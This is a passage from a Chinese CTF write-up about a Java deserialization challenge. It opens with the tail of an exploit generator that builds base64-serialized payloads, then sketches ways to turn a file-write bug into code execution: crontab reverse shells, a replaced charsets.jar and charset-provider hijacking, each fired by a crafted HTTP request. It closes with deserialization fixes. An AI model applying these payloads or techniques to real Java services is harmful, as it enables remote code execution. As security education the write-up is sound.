        }
        return result;
    }
    public static String Exp(Cart poc)throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(poc);
        baos.close();
        return (new BASE64Encoder().encode(baos.toByteArray()).replace("\r\n", ""));
    }
    public static void main(String[] args) throws Exception {
        System.out.println("--------------------------------------------get数据-------------------------------------------");
        System.out.println(getURLEncoderString(Exp(getPayload())));
        System.out.println("--------------------------------------------cookie数据----------------------------------------");
        System.out.println(Exp(cookiePayload()));
    }
## RCE思路
不过能写入文件并不能拿到flag,然后放了hint我记得是rce什么的。不过在之后的fix模式才知道项目是直接打包了jar java -jar
xx.jar启动，那写入文件有啥用？？
下面的思路是学长hpdoger给的说让我看看《[Spring Boot Fat Jar 写文件漏洞到稳定 RCE
的探索](https://landgrey.me/blog/22/)》这篇文章。
这也是我们的问题。
思路一：
写入`crontab` 计划任务文件，然后反弹shell。不过我也不知道有没有权限。。。。
思路二:
如果找到一种方法可以控制程序在指定的写文件漏洞可控的文件范围内，主动触发初始化恶意的类，就有可能让写文件漏洞变成代码执行漏洞。简单的说就是我们写入的文件进行了初始化操作会执行
static 代码块、static 属性引用的方法等，还可能执行构造器中的代码。然后我们将命令放在静态代码里面就可以执行了。
而这个文件范围在文章中说了可能是更底层的 “系统的 classpath 目录”，即 JDK HOME
目录下。既：/jre/lib/charsets.jar文件。
接下来就需要解决一个问题我们可以写入这个文件然后怎么触发？既：怎么主动触发可以控制类名的类初始化行为。
文章中有具体的分析这里就给出poc，替换过 `charsets.jar` 后，用如下的数据包就可触发 RCE 了 ^_^：
    GET / HTTP/1.1
    Accept: text/html;charset=GBK
    import requests
    headers = {"Accept": "text/html;charset=GBK"}
    requests.get(url, headers=headers)
思路三:
使用spi ServiceLoader.load(CharsetProvider.class,
cl);我只需要在系统的classpath中添加一个SPI类就行了。然后就是继承CharsetProvider重写里面的方法当利用Charset.forName()的时候触发rce。
思路四:
hook sun.nio.cs.ext.ExtendedCharsets
我们可以重写这个类然后添加恶意代码然后执行命令。可以劫持系统程序，不论是javac.exe编译字节码，还是运行jvm等，都会触发Charset.forName()。不过在该题目不能使用，因为题目环境是一直在运行的，不会重新启动所以也不会触发。
基本上利用的思路都是覆盖文件（替换charsets.jar包/写入classes文件夹）然后通过Charset.forName()触发。
不过在这个题目中自己测试了一下通过 “Accept”: “text/html;charset=evil;”触发不了，在回过头来看根本没有import
springframework导致利用不成功。并且项目里面自己没有找到Charset.forName()触发点。。。。。
不过思路可能是这个吧？！只是个人的猜想，不过这个题确实自己思考了有一段时间。
先挖一个坑在这里吧。。。。。。。。。
## Fix思路
之后的一个小时就是fix模式，对于java的fix自己最开始是完全没有思路的，是比赛结束之后自己学的思路和方法。于是就简单的记录一下。
[github上有一篇文章写的比较全](https://github.com/Cryin/Paper/blob/master/%E6%B5%85%E8%B0%88Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88.md)
这里自己只是实现其中的一个方法，而该方法也是[SerialKiller](https://github.com/ikkisoft/SerialKiller)项目的底层原理，也是很多框架使用的方法。
###  hook
hook ObjectInputStream类的resolveClass方法
>
> 需要继承Java.io.ObjectInputStream实现一个子类，在子类中重写resolveClass方法，以实现在其中通过判断类名来过滤危险类。然后在JavaSerializer类中使用这个子类来读取序列化数据，从而修复漏洞。
新建一个工具类：utils/Fix
    package ciscn.fina1.ezj4va.utils;
    import ciscn.fina1.ezj4va.domain.Cart;
    import java.io.*;
    public class Fix extends ObjectInputStream {
        public Fix(InputStream inputStream)
                throws IOException {
            super(inputStream);
        }
        /**
         * 只允许反序列化Cart.class
         */
        @Override
        protected Class resolveClass(ObjectStreamClass desc) throws IOException,
                ClassNotFoundException {
            if (!desc.getName().equals(Cart.class.getName())) {
                throw new InvalidClassException(
                        "Unauthorized deserialization attempt",
                        desc.getName());
            }
            return super.resolveClass(desc);
        }
    }
并且修改Deserializer类
    package ciscn.fina1.ezj4va.utils;
    import java.io.ByteArrayInputStream;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.util.Base64;
    public class Deserializer{
        public static Object deserialize(String base64data) throws IOException, ClassNotFoundException {
            ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data));
            Fix fix = new Fix(bais);
            Object obj = fix.readObject();
            fix.close();
            return obj;
        }
    }
###  修改suid
这个修复方案，是从Xenny师傅那学的，是通过修改关键类中(也就是题目的cart类)的serialVersionUID，[serialVersionUID](https://www.cnblogs.com/xuxinstyle/p/11394358.html)可以理解为java序列化的标识，只有满足序列化后的serialVersionUID值和序列化前的值一样才可以成功反序列化。不然会报出
**InvalidClassException**
错。可以这样理解因为出题人的exp肯定是构造好了的，于cart类的suid也是对应的，所以如果我们修改cart类的suid就会报错，并且这里可以使用工具修改就不需要反编译和打包了。
**JByteMod-1.8.2**
需要注意的是运行这个工具的时候jre运行环境一定要与项目的运行环境一致。
其他fix思路想不到希望师傅们能给出好方法。
## 总结
非常感谢Mrkaixin师傅和学长朱师傅还有Xenny师傅。虽然这个题最后还是没有RCE，不过有思路了，还学习了Spring Boot Fat
Jar写文件漏洞到稳定RCE，并且学习了java序列化题的fix思路和方法，总的来说这个题出的非常好，自己学习了不少。
最后: 给出题目环境和可能需要利用的的jar [github](https://github.com/Firebasky/ctf-Challenge)
> 参考：
>
> 
>
> 
>
> 
>
> 
>
> [一篇好文章](http://www.code2sec.com/ji-yi-ci-javafan-xu-lie-hua-lou-dong-de-fa-> xian-he-xiu-fu.html)